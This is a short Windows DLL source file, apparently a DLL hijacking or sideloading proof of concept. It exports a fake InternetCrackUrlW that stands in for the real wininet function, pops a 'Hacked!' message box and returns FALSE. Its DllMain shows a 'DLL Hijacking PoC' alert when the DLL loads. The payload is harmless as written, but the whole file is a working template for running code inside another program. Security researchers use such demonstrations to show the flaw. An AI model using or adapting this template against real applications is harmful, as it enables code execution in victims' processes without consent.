#include "pch.h"

#include <Windows.h>
#include <wininet.h>
__declspec(dllexport) BOOL WINAPI InternetCrackUrlW(
    LPCWSTR lpszUrl, DWORD dwUrlLength, DWORD dwFlags, LPURL_COMPONENTSW lpUrlComponents
) {
    MessageBoxA(NULL, "DLL Sideloading Successful!", "Hacked!", MB_OK | MB_ICONEXCLAMATION);
    return FALSE; 
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD dwReason, LPVOID lpReserved) {
    if (dwReason == DLL_PROCESS_ATTACH) {
        MessageBoxA(NULL, "DLL Loaded!", "DLL Hijacking PoC", MB_OK | MB_ICONINFORMATION);
    }
    return TRUE;
}
